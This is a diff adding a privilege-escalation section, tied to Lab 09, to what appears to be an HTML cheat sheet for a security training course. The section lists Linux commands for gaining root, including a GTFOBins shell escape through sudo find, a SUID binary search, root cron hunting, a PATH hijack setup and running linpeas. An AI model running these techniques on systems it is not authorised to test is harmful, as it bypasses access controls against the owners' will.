@@ -863,6 +863,94 @@
       </div>
     </section>
 
+    <!-- Category 3g: Privilege Escalation -->
+    <section class="cheat-section" id="privesc">
+      <div class="cheat-section__header">
+        <span style="font-size:1.25rem;">⬆️</span>
+        <h2 class="cheat-section__title">Privilege Escalation (Lab 09)</h2>
+      </div>
+      <div class="cheat-table-container">
+        <table class="cheat-table">
+          <thead>
+            <tr>
+              <th style="width:40%;">Command</th>
+              <th style="width:25%;">Action</th>
+              <th style="width:25%;">How it works</th>
+              <th style="width:10%;">Source</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>sudo -l</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('sudo -l')">Copy</button>
+                </div>
+              </td>
+              <td><strong>First privesc check, always</strong></td>
+              <td>Lists what you can run as another user. A <code>NOPASSWD</code> entry on a shell-capable binary is often instant root</td>
+              <td><a href="./labs/lab09.html#sudo-gtfobins" class="badge-lab-ref">Lab 09</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>sudo find . -exec /bin/sh \; -quit</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('sudo find . -exec /bin/sh \\; -quit')">Copy</button>
+                </div>
+              </td>
+              <td><strong>GTFOBins: find to root</strong></td>
+              <td>If you have sudo on <code>find</code>, its <code>-exec</code> runs <code>/bin/sh</code> as root. Look up any sudo/SUID binary on GTFOBins for its technique</td>
+              <td><a href="./labs/lab09.html#sudo-gtfobins" class="badge-lab-ref">Lab 09</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>find / -perm -4000 -type f 2>/dev/null</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('find / -perm -4000 -type f 2>/dev/null')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Find every SUID binary</strong></td>
+              <td>The <code>s</code> bit (<code>-rwsr-xr-x</code>) runs a program as its owner. Cross-check each hit against GTFOBins</td>
+              <td><a href="./labs/lab09.html#suid-cron" class="badge-lab-ref">Lab 09</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>cat /etc/crontab</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('cat /etc/crontab')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Hunt root cron jobs</strong></td>
+              <td>A job running as root that calls a script you can write to means you edit the script and wait for root to run it</td>
+              <td><a href="./labs/lab09.html#suid-cron" class="badge-lab-ref">Lab 09</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>export PATH=/tmp:$PATH</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('export PATH=/tmp:$PATH')">Copy</button>
+                </div>
+              </td>
+              <td><strong>PATH hijack setup</strong></td>
+              <td>A root SUID that calls a command by name (not full path) runs your fake copy from <code>/tmp</code> if it's first in <code>PATH</code></td>
+              <td><a href="./labs/lab09.html#going-pro" class="badge-lab-ref">Lab 09</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>./linpeas.sh</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('./linpeas.sh')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Automate the whole hunt</strong></td>
+              <td>Runs every privesc check at once and highlights findings in red. Learn the manual commands first so you know what it flags</td>
+              <td><a href="./labs/lab09.html#suid-cron" class="badge-lab-ref">Lab 09</a></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
     <!-- Category 4: Transport Layer & Handshake State Probing -->
     <section class="cheat-section" id="tcp-handshake">
       <div class="cheat-section__header">
